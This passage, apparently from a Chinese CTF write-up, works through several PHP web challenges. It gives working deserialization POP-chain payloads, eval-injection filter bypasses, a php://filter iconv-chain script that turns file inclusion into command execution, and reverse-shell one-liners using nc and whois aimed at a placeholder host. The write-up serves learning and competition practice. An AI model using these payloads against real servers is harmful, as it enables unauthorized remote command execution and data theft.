<p>那么试一下从<code>/flag</code>读一下，<code>$$(&lt;$&lt;)</code>，<code>$(&lt;/flag)</code><br />
<img src="https://picx.zhimg.com/80/v2-1a6195777ef6ee2e83aa4d6c802a2957_1440w.png" alt="" /></p>
<p>赛后发现<code>$(&lt;$&lt;)</code>跟<code>$$(&lt;$&lt;)</code>是一样的</p>
<h2 id="web-ezpop"><a class="markdownIt-Anchor" href="#web-ezpop"></a> Web ezPOP</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">           <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">           <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">           <span class="variable">$b</span> = <span class="variable">$_POST</span>;</span><br><span class="line">           <span class="variable">$c</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">           <span class="variable">$d</span> = <span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">               <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>, <span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">       <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>链子很简单：<code>CCC::__destruct()-&gt;AAA::__toString()-&gt;BBB::__get()</code><br />
主要是对<code>call_user_func($a, $b)($c)($d);</code>的理解<br />
还有这个姿势需要注意，<strong>PHP GC垃圾回收机制</strong><br />
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0">https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0</a><br />
还有就是<code>if (isset($b['a'])) &#123;                 unset($b['a']);             &#125;</code><br />
传入的b数组的a值会被删掉<br />
关于数组<br />
<img src="https://pic1.zhimg.com/80/v2-0417dcc9f73481a4991ea4d57a33a7de_1440w.png" alt="" /></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;c-&gt;s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>, <span class="number">0</span>));</span><br><span class="line"><span class="comment">#  a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;s:1:&quot;d&quot;;s:9:&quot;cat /flag&quot;;&#125;s:1:&quot;a&quot;;N;&#125;&#125;i:1;i:0;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?xy=a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;&#125;&#125;i:<span class="number">0</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line">post: a=array_pop&amp;b=array_pop</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="keyword">array</span>)是删除数组元素并返回(这个想法基于题目的删除机制想出来的)</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="keyword">array</span>(<span class="string">&quot;array_pop&quot;</span>))(<span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>))(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>))(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">或者：a=current&amp;b=current</span><br><span class="line"><span class="title function_ invoke__">current</span>(<span class="keyword">array</span>)是返回当前数组元素(那我不删除，直接返回也行)</span><br></pre></td></tr></table></figure>
<p>一开始犯病了，其实这道题早出了，因为用的<code>array_pop</code>和<code>current</code>都是要参数是数组，然后我就传了个数组进来，后面看了学弟的payload才惊醒，这个<br />
<strong>$b = $_POST;</strong><br />
说明post的表单都是b数组的了，所以不需要再传数组了，我就说没啥大问题的嘞，还是得注意细节</p>
<p>其实，传进来的a都被删掉了，那么a传什么值都无所谓的吧，主要看还post了什么，那个就是b的值，不过我后面也没有再去试验过了，应该是这样的吧()</p>
<h2 id="web-牢牢记住逝者为大"><a class="markdownIt-Anchor" href="#web-牢牢记住逝者为大"></a> Web 牢牢记住，逝者为大</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8354?time__1311=n4%2BxuDgDBDyD9iDnDGrxBk8ojqqPoCQDfhDiKx&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">https://xz.aliyun.com/t/8354?time__1311=n4%2BxuDgDBDyD9iDnDGrxBk8ojqqPoCQDfhDiKx&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a><br />
长度限制13，那就再传个参数进来当跳板，<strong>/?cmd=`$_GET[1]`</strong><br />
eval执行命令需要<code>;</code>，同时前面注释掉了，<code>%0a</code>换行符截断一下，<code>%23</code>注释掉后面的</p>
<p><strong>cmd=%0a`$_GET[1]`;%23&amp;1=</strong><br />
弹个shell<br />
<strong>whois -h ip -p port `more /[b-z][b-z][@-z][b-z]`</strong></p>
<p>赛后发现，原来反弹shell还有一种可以不用<code>/bin/bash</code>的，<code>nc ip port -e sh</code>，这样的甚至不需要<code>/</code>，复完<code>NewStarCTF2023</code>，发现也可以拼接一下，<code>nc ip port -e /bi''n/sh</code></p>
<p>还有一种是用<code>cp</code>的，虽然过滤了，但是<code>\</code>没有被过滤啊，可以转义<br />
<code>c\p /[@-z][@-z][@-z]g 1.txt</code>，最后访问<code>1.txt</code>就可以了</p>
<h2 id="web-ezclass"><a class="markdownIt-Anchor" href="#web-ezclass"></a> Web ezClass</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure>
<p>类？搜素发现PHP原生类<code>new $a($b);</code>这种就是可以利用原生类的特征<br />
<a target="_blank" rel="noopener" href="https://ch1e.gitee.io/2021/11/12/yuanshenglei/">https://ch1e.gitee.io/2021/11/12/yuanshenglei/</a><br />
emmmm，还需要调用原生类的方法，跟搜到的大部分题型都不一样，而且<code>(new $a($aa))-&gt;$c()</code>应该是要作为函数来调用，<code>(new $b($bb))-&gt;$c()</code>作为参数调用，我们很容易想到<code>system</code>函数<br />
找了好久发现，ArrayIterator类可以调用<code>current</code>方法来返回当前的值<br />
<a target="_blank" rel="noopener" href="https://php.github.net.cn/manual/zh/arrayiterator.current.php">https://php.github.net.cn/manual/zh/arrayiterator.current.php</a></p>
<p>关于ArrayIterator类利用的题目找到<br />
<a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#</a></p>
<p>注意到属性需要传入数组，有<br />
<code>/?a=ArrayIterator&amp;aa[]=system&amp;c=current&amp;b=ArrayIterator&amp;bb[]=ls /</code></p>
<p>赛后发现另外的思路<strong>利用php的Error类带出信息</strong><br />
<code>/?a=Error&amp;b=Error&amp;aa=system&amp;bb=cat /f*&amp;c=getMessage</code></p>
<h2 id="web-ezlfi"><a class="markdownIt-Anchor" href="#web-ezlfi"></a> Web ezLFI</h2>
<p>LFI，本地文件包含<br />
常见的PHP伪协议感觉都没反应，应该被过滤了？<br />
告诉了我们，flag位置是在<code>/readflag</code><br />
可以<strong>利用filter过滤器的编码组合构造RCE</strong><br />
<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2287108?areaId=106001">https://cloud.tencent.com/developer/article/2287108?areaId=106001</a><br />
原文<a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a><br />
出自<strong>PHP_INCLUDE_TO_SHELL_CHAR_DICT，php://filter特性包含任意文件getshell</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:49819/?file=&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;/readflag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">    filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">    <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># get rid of equal signs</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="web-ezserialize"><a class="markdownIt-Anchor" href="#web-ezserialize"></a> Web ezSerialize</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pop</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pop</span>-&gt;<span class="title function_ invoke__">login</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>首先，绕过<code>$this-&gt;token === $this-&gt;password</code>，利用引用传递让二者相等</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;password = &amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p><strong>fpclosefpclosefpcloseffflllaaaggg.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> 